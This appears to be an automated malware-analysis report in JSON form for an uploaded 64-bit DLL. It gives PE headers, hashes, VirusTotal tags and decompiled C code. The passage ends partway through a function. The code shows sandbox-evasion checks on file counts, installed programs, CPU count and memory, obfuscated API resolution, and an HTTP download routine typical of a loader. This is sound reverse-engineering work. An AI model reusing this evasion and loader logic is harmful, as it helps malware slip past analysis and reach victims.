{
  "get_metadata": {
    "path": "D:\\Whitehat\\web\\YARRAI_Web\\backend\\uploads\\85c4eb75-76e2-42dc-a702-08cf0f79340a.exe",
    "module": "85c4eb75-76e2-42dc-a702-08cf0f79340a.exe",
    "base": "0x62740000",
    "size": "0x18000",
    "md5": "8b9178700e6738aeb688a3f6ae28f02e",
    "sha256": "d3b437ebe0504f8ff71d2025faabf84119c9aaccb38f34d4130f7c633ce4b37f",
    "crc32": "0xed5703d",
    "filesize": "0xf000"
  },
  "get_current_address": "0x62741350",
  "get_current_function": "0x62741350",
  "get_entry_points": [
    {
      "address": "0x627414c0",
      "name": "DllGetClassObject",
      "size": "0x13"
    },
    {
      "address": "0x62741480",
      "name": "DllRegisterServer",
      "size": "0x13"
    },
    {
      "address": "0x627414a0",
      "name": "DllRegisterServerEx",
      "size": "0x13"
    },
    {
      "address": "0x627414e0",
      "name": "DllUnregisterServer",
      "size": "0x13"
    },
    {
      "address": "0x62741500",
      "name": "Start",
      "size": "0xf"
    },
    {
      "address": "0x62748700",
      "name": "TlsCallback_0",
      "size": "0x81"
    },
    {
      "address": "0x627486d0",
      "name": "TlsCallback_1",
      "size": "0x2f"
    },
    {
      "address": "0x62741350",
      "name": "DllEntryPoint",
      "size": "0x4f"
    }
  ],
  "file_entropy": 6.075454182915676,
  "string_stats": {
    "string_count": 153,
    "avg_str_len": 0.0,
    "max_str_len": 0
  },
  "pe_headers": {
    "file_name": "85c4eb75-76e2-42dc-a702-08cf0f79340a.exe",
    "machine": "0x8664",
    "number_of_sections": 11,
    "time_date_stamp": "0x5f7684ea",
    "pointer_to_symbol_table": "0x0",
    "number_of_symbols": 0,
    "size_of_optional_header": 240,
    "characteristics": "0x222e",
    "entry_point": "0x1350",
    "image_base": "0x62740000",
    "section_alignment": "0x1000",
    "file_alignment": "0x200",
    "subsystem": "0x2",
    "dll_characteristics": "0x0",
    "sections": [
      {
        "name": ".text",
        "virtual_address": "0x1000",
        "virtual_size": "0x8ad8",
        "raw_size": "0x8c00",
        "characteristics": "0x60500060"
      },
      {
        "name": ".data",
        "virtual_address": "0xa000",
        "virtual_size": "0x6b0",
        "raw_size": "0x800",
        "characteristics": "0xc0600040"
      },
      {
        "name": ".rdata",
        "virtual_address": "0xb000",
        "virtual_size": "0x30b0",
        "raw_size": "0x3200",
        "characteristics": "0x40600040"
      },
      {
        "name": ".pdata",
        "virtual_address": "0xf000",
        "virtual_size": "0x5a0",
        "raw_size": "0x600",
        "characteristics": "0x40300040"
      },
      {
        "name": ".xdata",
        "virtual_address": "0x10000",
        "virtual_size": "0x5cc",
        "raw_size": "0x600",
        "characteristics": "0x40300040"
      },
      {
        "name": ".bss",
        "virtual_address": "0x11000",
        "virtual_size": "0xb50",
        "raw_size": "0x0",
        "characteristics": "0xc0600080"
      },
      {
        "name": ".edata",
        "virtual_address": "0x12000",
        "virtual_size": "0xb8",
        "raw_size": "0x200",
        "characteristics": "0x40300040"
      },
      {
        "name": ".idata",
        "virtual_address": "0x13000",
        "virtual_size": "0x1090",
        "raw_size": "0x1200",
        "characteristics": "0xc0300040"
      },
      {
        "name": ".CRT",
        "virtual_address": "0x15000",
        "virtual_size": "0x58",
        "raw_size": "0x200",
        "characteristics": "0xc0400040"
      },
      {
        "name": ".tls",
        "virtual_address": "0x16000",
        "virtual_size": "0x10",
        "raw_size": "0x200",
        "characteristics": "0xc0400040"
      },
      {
        "name": ".reloc",
        "virtual_address": "0x17000",
        "virtual_size": "0x170",
        "raw_size": "0x200",
        "characteristics": "0x42300040"
      }
    ]
  },
  "virustotal": {
    "sha256": "d3b437ebe0504f8ff71d2025faabf84119c9aaccb38f34d4130f7c633ce4b37f",
    "type_tag": "pedll",
    "popular_threat_name": null,
    "tags": [
      "checks-cpu-name",
      "detect-debug-environment",
      "64bits",
      "pedll",
      "long-sleeps"
    ]
  },
  "c_code": [
    "#include \"85c4eb75-76e2-42dc-a702-08cf0f79340a.h\"",
    "",
    "__int64 __fastcall sub_62741010(__int64 a1, int a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "  PVOID StackBase; // rsi",
    "  signed __int64 v7; // rax",
    "  int v8; // edi",
    "",
    "  if ( a2 )",
    "  {",
    "    if ( a2 == 1 )",
    "    {",
    "      StackBase = NtCurrentTeb()->NtTib.StackBase;",
    "      while ( 1 )",
    "      {",
    "        v7 = _InterlockedCompareExchange64(qword_62751B48, (signed __int64)StackBase, 0);",
    "        if ( !v7 )",
    "        {",
    "          v8 = 0;",
    "          goto LABEL_15;",
    "        }",
    "        if ( StackBase == (PVOID)v7 )",
    "          break;",
    "        Sleep(0x3E8u);",
    "      }",
    "      v8 = 1;",
    "LABEL_15:",
    "      if ( unk_62751B40 == 1 )",
    "      {",
    "        amsg_exit(31);",
    "      }",
    "      else if ( !unk_62751B40 )",
    "      {",
    "        unk_62751B40 = 1;",
    "        initterm(&qword_62755010, qword_62755020);",
    "      }",
    "      if ( unk_62751B40 == 1 )",
    "      {",
    "        initterm(&qword_62755000, &qword_62755008);",
    "        unk_62751B40 = 2;",
    "      }",
    "      if ( !v8 )",
    "        _InterlockedExchange64(qword_62751B48, 0);",
    "      if ( TlsCallback_0 )",
    "        TlsCallback_0(a1, 2, a3);",
    "      ++dword_62751018;",
    "      return 1;",
    "    }",
    "    else",
    "    {",
    "      return 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    result = 0;",
    "    if ( dword_62751018 > 0 )",
    "    {",
    "      --dword_62751018;",
    "      while ( _InterlockedCompareExchange64(qword_62751B48, 1, 0) )",
    "        Sleep(0x3E8u);",
    "      if ( unk_62751B40 == 2 )",
    "      {",
    "        sub_627499E0(&unk_62751000);",
    "        unk_62751B40 = 0;",
    "        _InterlockedExchange64(qword_62751B48, 0);",
    "        return 1;",
    "      }",
    "      else",
    "      {",
    "        amsg_exit(31);",
    "        return 1;",
    "      }",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62741200(void *a1, unsigned int a2, __int64 a3)",
    "{",
    "  unsigned int v6; // r14d",
    "  __int64 result; // rax",
    "",
    "  unk_6274A674 = a2;",
    "  if ( a2 )",
    "  {",
    "    sub_62748A20();",
    "    if ( a2 - 1 <= 1 )",
    "    {",
    "      if ( !(unsigned int)sub_62741010((__int64)a1, a2, a3) )",
    "        goto LABEL_5;",
    "      v6 = sub_62749810(a1, a2, a3);",
    "      if ( v6 )",
    "      {",
    "        if ( a2 != 1 )",
    "        {",
    "          v6 = sub_62741420(a1);",
    "          goto LABEL_6;",
    "        }",
    "        sub_627484D0();",
    "        v6 = sub_62741420(a1);",
    "        if ( v6 )",
    "          goto LABEL_6;",
    "        sub_62741420(a1);",
    "        sub_62749810(a1, 0, a3);",
    "      }",
    "      else if ( a2 != 1 )",
    "      {",
    "        goto LABEL_5;",
    "      }",
    "      sub_62741010((__int64)a1, 0, a3);",
    "      goto LABEL_6;",
    "    }",
    "    v6 = sub_62741420(a1);",
    "    if ( a2 != 3 )",
    "      goto LABEL_6;",
    "  }",
    "  else",
    "  {",
    "    if ( !dword_62751018 )",
    "    {",
    "LABEL_5:",
    "      v6 = 0;",
    "      goto LABEL_6;",
    "    }",
    "    sub_62748A20();",
    "    sub_62741420(a1);",
    "  }",
    "  v6 = sub_62749810(a1, a2, a3);",
    "  if ( !(unsigned int)sub_62741010((__int64)a1, a2, a3) )",
    "    goto LABEL_5;",
    "LABEL_6:",
    "  result = v6;",
    "  unk_6274A674 = -1;",
    "  return result;",
    "}",
    "",
    "",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)",
    "{",
    "  unk_62751810 = 0;",
    "  if ( fdwReason != 1 )",
    "    return sub_62741200(hinstDLL, fdwReason, (__int64)lpReserved);",
    "  sub_627484F0();",
    "  sub_62748ED0();",
    "  return sub_62741200(hinstDLL, 1u, (__int64)lpReserved);",
    "}",
    "",
    "",
    "__int64 __fastcall StartAddress(HMODULE lpThreadParameter)",
    "{",
    "  sub_62741DE0(lpThreadParameter);",
    "  dword_62751020 = 1;",
    "  return 0;",
    "}",
    "",
    "",
    "void sub_627413F0()",
    "{",
    "  while ( !dword_62751020 )",
    "    Sleep(0x3E8u);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62741420(LPVOID lpParameter, int a2)",
    "{",
    "  HANDLE Thread; // rax",
    "  DWORD ThreadId[3]; // [rsp+3Ch] [rbp-Ch] BYREF",
    "",
    "  if ( a2 != 1 )",
    "    return 1;",
    "  Thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, lpParameter, 0, ThreadId);",
    "  if ( !Thread )",
    "    return 1;",
    "  CloseHandle(Thread);",
    "  return 1;",
    "}",
    "",
    "",
    "HRESULT __stdcall DllRegisterServer()",
    "{",
    "  sub_627413F0();",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 DllRegisterServerEx()",
    "{",
    "  sub_627413F0();",
    "  return 0;",
    "}",
    "",
    "",
    "HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)",
    "{",
    "  sub_627413F0();",
    "  return -2147221231;",
    "}",
    "",
    "",
    "HRESULT __stdcall DllUnregisterServer()",
    "{",
    "  sub_627413F0();",
    "  return 0;",
    "}",
    "",
    "",
    "void Start()",
    "{",
    "  sub_627413F0();",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_62741530(_BYTE *a1, _BYTE *a2, int a3)",
    "{",
    "  _BYTE *v3; // r9",
    "  _BYTE *v4; // r10",
    "  int v5; // ebx",
    "  _BYTE *v6; // r9",
    "  _BYTE *v7; // r11",
    "  _BYTE *v8; // rdx",
    "",
    "  if ( a3 - 2 <= 0 )",
    "  {",
    "    v4 = a1;",
    "    v5 = 0;",
    "  }",
    "  else",
    "  {",
    "    v3 = a2;",
    "    v4 = a1;",
    "    v5 = 0;",
    "    do",
    "    {",
    "      *v4 = aAbcdefghijklmn[*v3 >> 2];",
    "      v4[1] = aAbcdefghijklmn[((char)v3[1] >> 4) & 0xF | (16 * *v3) & 0x30];",
    "      v4[2] = aAbcdefghijklmn[((char)v3[2] >> 6) & 3 | (4 * v3[1]) & 0x3C];",
    "      v4 += 4;",
    "      *(v4 - 1) = aAbcdefghijklmn[v3[2] & 0x3F];",
    "      v5 += 3;",
    "      v3 += 3;",
    "    }",
    "    while ( v5 < a3 - 2 );",
    "  }",
    "  if ( a3 > v5 )",
    "  {",
    "    v6 = &a2[v5];",
    "    *v4 = aAbcdefghijklmn[*v6 >> 2];",
    "    if ( a3 - 1 == v5 )",
    "    {",
    "      v4[1] = aAbcdefghijklmn[(16 * *v6) & 0x30];",
    "      v8 = v4 + 3;",
    "      v4[2] = 61;",
    "    }",
    "    else",
    "    {",
    "      v7 = &a2[v5 + 1];",
    "      v4[1] = aAbcdefghijklmn[((char)*v7 >> 4) & 0xF | (16 * *v6) & 0x30];",
    "      v8 = v4 + 3;",
    "      v4[2] = aAbcdefghijklmn[(4 * *v7) & 0x3C];",
    "    }",
    "    v4 = v8 + 1;",
    "    *v8 = 61;",
    "  }",
    "  *v4 = 0;",
    "  return (_BYTE *)(v4 + 1 - a1);",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_62741690(_BYTE *a1, _BYTE *a2, int a3)",
    "{",
    "  _BYTE *v3; // r9",
    "  _BYTE *v4; // r10",
    "  int v5; // ebx",
    "  _BYTE *v6; // r9",
    "  _BYTE *v7; // r11",
    "  _BYTE *v9; // r10",
    "",
    "  if ( a3 - 2 <= 0 )",
    "  {",
    "    v4 = a1;",
    "    v5 = 0;",
    "  }",
    "  else",
    "  {",
    "    v3 = a2;",
    "    v4 = a1;",
    "    v5 = 0;",
    "    do",
    "    {",
    "      *v4 = aAbcdefghijklmn_0[*v3 >> 2];",
    "      v4[1] = aAbcdefghijklmn_0[((char)v3[1] >> 4) & 0xF | (16 * *v3) & 0x30];",
    "      v4[2] = aAbcdefghijklmn_0[((char)v3[2] >> 6) & 3 | (4 * v3[1]) & 0x3C];",
    "      v4 += 4;",
    "      *(v4 - 1) = aAbcdefghijklmn_0[v3[2] & 0x3F];",
    "      v5 += 3;",
    "      v3 += 3;",
    "    }",
    "    while ( v5 < a3 - 2 );",
    "  }",
    "  if ( a3 <= v5 )",
    "    goto LABEL_7;",
    "  v6 = &a2[v5];",
    "  *v4 = aAbcdefghijklmn_0[*v6 >> 2];",
    "  if ( a3 - 1 != v5 )",
    "  {",
    "    v7 = &a2[v5 + 1];",
    "    v4[1] = aAbcdefghijklmn_0[((char)*v7 >> 4) & 0xF | (16 * *v6) & 0x30];",
    "    v4[2] = aAbcdefghijklmn_0[(4 * *v7) & 0x3C];",
    "    v4 += 3;",
    "LABEL_7:",
    "    *v4 = 0;",
    "    return (_BYTE *)(v4 + 1 - a1);",
    "  }",
    "  v4[1] = aAbcdefghijklmn_0[(16 * *v6) & 0x30];",
    "  v9 = v4 + 2;",
    "  *v9 = 0;",
    "  return (_BYTE *)(v9 + 1 - a1);",
    "}",
    "",
    "",
    "int sub_627417F0(wchar_t *a1, size_t a2, const wchar_t *a3, ...)",
    "{",
    "  va_list Args; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  va_start(Args, a3);",
    "  return vsnwprintf(a1, a2, a3, Args);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62741810(__int64 a1)",
    "{",
    "  const wchar_t *v2; // rbx",
    "  __int64 v3; // rsi",
    "  unsigned int v4; // ebx",
    "  const wchar_t *v5; // rbp",
    "  const wchar_t *v6; // r12",
    "  const WCHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "  const CHAR *v10; // rbx",
    "  const CHAR *v11; // rbx",
    "  wchar_t v12[264]; // [rsp+20h] [rbp-498h] BYREF",
    "  _BYTE v13[44]; // [rsp+230h] [rbp-288h] BYREF",
    "  wchar_t String1[302]; // [rsp+25Ch] [rbp-25Ch] BYREF",
    "",
    "  if ( hModule )",
    "  {",
    "    if ( qword_62751048 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v8 = (const WCHAR *)sub_62746BA0(&unk_6274B0C0);",
    "    hModule = LoadLibraryW(v8);",
    "    sub_62746C30(v8);",
    "    if ( qword_62751048 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751040 )",
    "        goto LABEL_4;",
    "LABEL_16:",
    "      v10 = (const CHAR *)sub_62746B10(&unk_6274B0F8);",
    "      qword_62751040 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(hModule, v10);",
    "      sub_62746C30(v10);",
    "      if ( qword_62751038 )",
    "        goto LABEL_5;",
    "      goto LABEL_17;",
    "    }",
    "  }",
    "  v9 = (const CHAR *)sub_62746B10(&unk_6274B0E1);",
    "  qword_62751048 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(hModule, v9);",
    "  sub_62746C30(v9);",
    "  if ( !qword_62751040 )",
    "    goto LABEL_16;",
    "LABEL_4:",
    "  if ( qword_62751038 )",
    "    goto LABEL_5;",
    "LABEL_17:",
    "  v11 = (const CHAR *)sub_62746B10(&unk_6274B10E);",
    "  qword_62751038 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(hModule, v11);",
    "  sub_62746C30(v11);",
    "LABEL_5:",
    "  v2 = (const wchar_t *)sub_62746BA0(&unk_6274B120);",
    "  sub_627417F0(v12, 0x104u, v2, a1);",
    "  sub_62746C30(v2);",
    "  v3 = qword_62751048(v12, v13);",
    "  v4 = 0;",
    "  if ( v3 != -1 )",
    "  {",
    "    v5 = (const wchar_t *)sub_62746BA0(&unk_6274B137);",
    "    v6 = (const wchar_t *)sub_62746BA0(&unk_6274B142);",
    "    while ( 1 )",
    "    {",
    "      while ( (v13[0] & 0x10) == 0 )",
    "      {",
    "        ++v4;",
    "LABEL_8:",
    "        if ( !(unsigned int)qword_62751040(v3, v13) )",
    "          goto LABEL_12;",
    "      }",
    "      if ( !wcscmp(String1, v5) )",
    "        goto LABEL_8;",
    "      v4 -= (wcscmp(String1, v6) == 0) - 1;",
    "      if ( !(unsigned int)qword_62751040(v3, v13) )",
    "      {",
    "LABEL_12:",
    "        sub_62746C30(v6);",
    "        sub_62746C30(v5);",
    "        qword_62751038(v3);",
    "        return v4;",
    "      }",
    "    }",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 sub_62741A50()",
    "{",
    "  int v0; // edx",
    "  __int64 result; // rax",
    "  const CHAR *v2; // rbx",
    "  const WCHAR *v3; // rbx",
    "  _BYTE v4[536]; // [rsp+20h] [rbp-218h] BYREF",
    "",
    "  if ( !hModule )",
    "  {",
    "    v3 = (const WCHAR *)sub_62746BA0(&unk_6274B150);",
    "    hModule = LoadLibraryW(v3);",
    "    sub_62746C30(v3);",
    "  }",
    "  if ( !qword_62751030 )",
    "  {",
    "    v2 = (const CHAR *)sub_62746B10(&unk_6274B171);",
    "    qword_62751030 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(hModule, v2);",
    "    sub_62746C30(v2);",
    "  }",
    "  v0 = qword_62751030(260, v4);",
    "  result = 0;",
    "  if ( v0 )",
    "    return sub_62741810((__int64)v4);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_62741B10()",
    "{",
    "  HRESULT v0; // edx",
    "  __int64 result; // rax",
    "  WCHAR pszPath[268]; // [rsp+30h] [rbp-218h] BYREF",
    "",
    "  v0 = SHGetFolderPathW(0, 26, 0, 0, pszPath);",
    "  result = 0;",
    "  if ( v0 >= 0 )",
    "    return sub_62741810((__int64)pszPath);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_62741B60()",
    "{",
    "  const WCHAR *v0; // rdi",
    "  unsigned int v1; // esi",
    "  const WCHAR *v3; // r13",
    "  DWORD i; // ebx",
    "  DWORD cchName; // [rsp+4Ch] [rbp-25Ch] BYREF",
    "  HKEY phkResult; // [rsp+50h] [rbp-258h] BYREF",
    "  HKEY hKey; // [rsp+58h] [rbp-250h] BYREF",
    "  WCHAR Name[292]; // [rsp+60h] [rbp-248h] BYREF",
    "",
    "  v0 = (const WCHAR *)sub_62746BA0(&unk_6274B188);",
    "  v1 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, v0, 0, 0x108u, &hKey);",
    "  if ( v1 )",
    "  {",
    "    v1 = 0;",
    "  }",
    "  else",
    "  {",
    "    v3 = (const WCHAR *)sub_62746BA0(&unk_6274B1F8);",
    "    for ( i = 0; ; ++i )",
    "    {",
    "      wcscpy((wchar_t *)&cchName, L\"Ą\");",
    "      if ( RegEnumKeyExW(hKey, i, Name, &cchName, 0, 0, 0, 0) )",
    "        break;",
    "      if ( !RegOpenKeyExW(hKey, Name, 0, 0x101u, &phkResult) )",
    "      {",
    "        v1 += RegQueryValueExW(phkResult, v3, 0, 0, 0, 0) == 0;",
    "        RegCloseKey(phkResult);",
    "      }",
    "    }",
    "    sub_62746C30(v3);",
    "    RegCloseKey(hKey);",
    "  }",
    "  sub_62746C30(v0);",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 sub_62741CD0()",
    "{",
    "  const WCHAR *v0; // rbx",
    "  HMODULE ModuleHandleW; // rsi",
    "  const CHAR *v2; // rbx",
    "  FARPROC ProcAddress; // rsi",
    "  __int64 result; // rax",
    "  int v5; // [rsp+20h] [rbp-58h] BYREF",
    "  unsigned __int64 v6; // [rsp+28h] [rbp-50h]",
    "",
    "  v0 = (const WCHAR *)sub_62746BA0(&unk_6274B220);",
    "  ModuleHandleW = GetModuleHandleW(v0);",
    "  sub_62746C30(v0);",
    "  v2 = (const CHAR *)sub_62746B10(&unk_6274B241);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v2);",
    "  sub_62746C30(v2);",
    "  v5 = 64;",
    "  result = ((__int64 (__fastcall *)(int *))ProcAddress)(&v5);",
    "  if ( (_DWORD)result )",
    "    return v6 >> 20;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_62741D50()",
    "{",
    "  const WCHAR *v0; // rbx",
    "  HMODULE ModuleHandleW; // rsi",
    "  const CHAR *v2; // rbx",
    "  FARPROC ProcAddress; // rsi",
    "  struct _SYSTEM_INFO SystemInfo; // [rsp+20h] [rbp-48h] BYREF",
    "",
    "  v0 = (const WCHAR *)sub_62746BA0(&unk_6274B260);",
    "  ModuleHandleW = GetModuleHandleW(v0);",
    "  sub_62746C30(v0);",
    "  v2 = (const CHAR *)sub_62746B10(&unk_6274B281);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v2);",
    "  sub_62746C30(v2);",
    "  if ( ProcAddress )",
    "    ((void (__fastcall *)(struct _SYSTEM_INFO *))ProcAddress)(&SystemInfo);",
    "  else",
    "    GetSystemInfo(&SystemInfo);",
    "  return SystemInfo.dwNumberOfProcessors;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62741DE0(HMODULE hModule)",
    "{",
    "  __int64 result; // rax",
    "",
    "  if ( (int)sub_62741A50() > 14 || (int)sub_62741B10() > 4 || (result = sub_62741B60(), (int)result > 4) )",
    "  {",
    "    if ( (unsigned int)sub_62741D50() > 3 && (int)sub_62741CD0() > 3839 )",
    "    {",
    "      return sub_62745AC0(hModule);",
    "    }",
    "    else",
    "    {",
    "      if ( (unsigned int)sub_62741D50() > 7 )",
    "        return sub_62745AC0(hModule);",
    "      result = sub_62741CD0();",
    "      if ( (int)result > 5887 )",
    "        return sub_62745AC0(hModule);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char *__fastcall sub_62741F30(",
    "        __int64 a1,",
    "        __int64 a2,",
    "        unsigned __int16 a3,",
    "        int a4,",
    "        __int64 a5,",
    "        HKEY *String,",
    "        __int64 a7,",
    "        int a8,",
    "        _DWORD *a9,",
    "        int a10)",
    "{",
    "  __int64 v14; // rax",
    "  __int64 v15; // rdi",
    "  __int64 v16; // r13",
    "  char *v17; // rbx",
    "  __int64 v18; // rsi",
    "  __int64 v19; // rbp",
    "  const wchar_t *v20; // rsi",
    "  size_t v21; // rbx",
    "  size_t v22; // rax",
    "  wchar_t *v23; // rax",
    "  wchar_t *v24; // rbx",
    "  int v25; // esi",
    "  int v26; // r12d",
    "  const WCHAR *v28; // rdi",
    "  const CHAR *v29; // rdi",
    "  const CHAR *v30; // rdi",
    "  const CHAR *v31; // rdi",
    "  const CHAR *v32; // rdi",
    "  const CHAR *v33; // rdi",
    "  const CHAR *v34; // rdi",
    "  const CHAR *v35; // rdi",
    "  const CHAR *v36; // rdi",
    "  DWORD LastError; // eax",
    "  int v38; // [rsp+40h] [rbp-58h] BYREF",
    "  int v39; // [rsp+44h] [rbp-54h] BYREF",
    "  int v40; // [rsp+48h] [rbp-50h] BYREF",
    "  _DWORD v41[19]; // [rsp+4Ch] [rbp-4Ch] BYREF",
    "",
    "  if ( qword_627510A0 )",
    "  {",
    "    if ( qword_62751098 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v28 = (const WCHAR *)sub_62746BA0(&unk_6274B2A0);",
    "    qword_627510A0 = LoadLibraryW(v28);",
    "    sub_62746C30(v28);",
    "    if ( qword_62751098 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751090 )",
    "        goto LABEL_4;",
    "      goto LABEL_35;",
    "    }",
    "  }",
    "  v29 = (const CHAR *)sub_62746B10(&unk_6274B2BF);",
    "  qword_62751098 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD))GetProcAddress(qword_627510A0, v29);",
    "  sub_62746C30(v29);",
    "  if ( qword_62751090 )",
    "  {",
    "LABEL_4:",
    "    if ( qword_62751088 )",
    "      goto LABEL_5;",
    "    goto LABEL_36;",
    "  }",
    "LABEL_35:",
    "  v30 = (const CHAR *)sub_62746B10(&unk_6274B2D5);",
    "  qword_62751090 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_627510A0, v30);",
    "  sub_62746C30(v30);",
    "  if ( qword_62751088 )",
    "  {",
    "LABEL_5:",
    "    if ( qword_62751080 )",
    "      goto LABEL_6;",
    "    goto LABEL_37;",
    "  }",
    "LABEL_36:",
    "  v31 = (const CHAR *)sub_62746B10(&unk_6274B2F0);",
    "  qword_62751088 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_627510A0, v31);",
    "  sub_62746C30(v31);",
    "  if ( qword_62751080 )",
    "  {",
    "LABEL_6:",
    "    if ( qword_62751078 )",
    "      goto LABEL_7;",
    "    goto LABEL_38;",
    "  }",
    "LABEL_37:",
    "  v32 = (const CHAR *)sub_62746B10(&unk_6274B30D);",
    "  qword_62751080 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD, _QWORD))GetProcAddress(qword_627510A0, v32);",
    "  sub_62746C30(v32);",
    "  if ( qword_62751078 )",
    "  {",
    "LABEL_7:",
    "    if ( qword_62751070 )",
    "      goto LABEL_8;",
    "    goto LABEL_39;",
    "  }",
    "LABEL_38:",
    "  v33 = (const CHAR *)sub_62746B10(&unk_6274B326);",
    "  qword_62751078 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD))GetProcAddress(qword_627510A0, v33);",
    "  sub_62746C30(v33);",
    "  if ( qword_62751070 )",
    "  {",
    "LABEL_8:",
    "    if ( qword_62751068 )",
    "      goto LABEL_9;",
    "LABEL_40:",
    "    v35 = (const CHAR *)sub_62746B10(&unk_6274B358);",
    "    qword_62751068 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_627510A0, v35);",
    "    sub_62746C30(v35);",
    "    if ( qword_62751060 )",
    "      goto LABEL_10;",
    "    goto LABEL_41;",
    "  }",
    "LABEL_39:",
    "  v34 = (const CHAR *)sub_62746B10(&unk_6274B33F);",
    "  qword_62751070 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD))GetProcAddress(qword_627510A0, v34);",
    "  sub_62746C30(v34);",
    "  if ( !qword_62751068 )",
    "    goto LABEL_40;",
    "LABEL_9:",
    "  if ( qword_62751060 )",
    "    goto LABEL_10;",
    "LABEL_41:",
    "  v36 = (const CHAR *)sub_62746B10(&unk_6274B371);",
    "  qword_62751060 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510A0, v36);",
    "  sub_62746C30(v36);",
    "LABEL_10:",
    "  v14 = qword_62751098(a1, 0, 0, 0, 0);",
    "  v15 = v14;",
    "  if ( !v14 )",
    "    return 0;",
    "  v41[0] = 60000;",
    "  qword_62751090(v14, 2, v41, 4);",
    "  qword_62751090(v15, 5, v41, 4);",
    "  qword_62751090(v15, 6, v41, 4);",
    "  v16 = qword_62751080(v15, a2, a3, 0, 0, 3, 0, 0);",
    "  v17 = (char *)v16;",
    "  if ( v16 )",
    "  {",
    "    if ( a4 == 2 )",
    "    {",
    "      v18 = sub_62746BA0(&unk_6274B39C);",
    "    }",
    "    else",
    "    {",
    "      v18 = sub_62746BA0(&unk_6274B38D);",
    "      a8 = 0;",
    "      a7 = 0;",
    "    }",
    "    v19 = qword_62751078(v16, v18, a5, 0, 0, 0, a10 == 0 ? -2142765056 : -2134376448, 0);",
    "    sub_62746C30(v18);",
    "    v17 = (char *)v19;",
    "    if ( v19 )",
    "    {",
    "      if ( String )",
    "      {",
    "        v20 = (const wchar_t *)sub_62746BA0(&unk_6274B3AD);",
    "        v21 = wcslen(v20);",
    "        v22 = wcslen((const wchar_t *)String);",
    "        v23 = (wchar_t *)sub_62745B80(2 * (v21 + v22 + 1));",
    "        v24 = v23;",
    "        if ( v23 )",
    "        {",
    "          wcscpy(v23, v20);",
    "          wcscat(v24, (const wchar_t *)String);",
    "        }",
    "        sub_62746C30(v20);",
    "        String = (HKEY *)v24;",
    "      }",
    "      SetLastError(0);",
    "      qword_62751070(v19, String, 0, a7, a8);",
    "      if ( a10 )",
    "      {",
    "        LastError = GetLastError();",
    "        if ( LastError == 12045 || LastError == 12057 )",
    "        {",
    "          v39 = 4;",
    "          qword_62751088(v19, 31, &v40, &v39);",
    "          v40 |= 0x3180u;",
    "          qword_62751090(v19, 31, &v40, 4);",
    "          qword_62751070(v19, 0, 0, a7, a8);",
    "        }",
    "      }",
    "      v17 = (char *)sub_62745B80(0x1000u);",
    "      v25 = 0;",
    "      v26 = 0;",
    "      if ( v17 )",
    "      {",
    "        while ( (unsigned int)qword_62751068(v19, &v17[v25], 4096, &v38) && v38 )",
    "        {",
    "          v26 += v38;",
    "          v17 = (char *)sub_62745BB0(v17, (unsigned int)(v25 + 0x2000));",
    "          v25 += 4096;",
    "        }",
    "        if ( v26 )",
    "        {",
    "          *a9 = v26;",
    "        }",
    "        else",
    "        {",
    "          sub_62745BE0(v17);",
    "          v17 = 0;",
    "        }",
    "      }",
    "      qword_62751060(v19);",
    "    }",
    "    qword_62751060(v16);",
    "  }",
    "  qword_62751060(v15);",
    "  return v17;",
    "}",
    "",
    "",
    "int sub_62742580(wchar_t *a1, size_t a2, const wchar_t *a3, ...)",
    "{",
    "  va_list Args; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  va_start(Args, a3);",
    "  return vsnwprintf(a1, a2, a3, Args);",
    "}",
    "",
    "",
    "CHAR *__fastcall sub_627425A0(LPCWCH lpWideCharStr)",
    "{",
    "  int v2; // eax",
    "  int cbMultiByte; // ebx",
    "  CHAR *v4; // rsi",
    "  CHAR *lpMultiByteStr; // rax",
    "",
    "  v2 = WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, 0, 0, 0, 0);",
    "  cbMultiByte = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
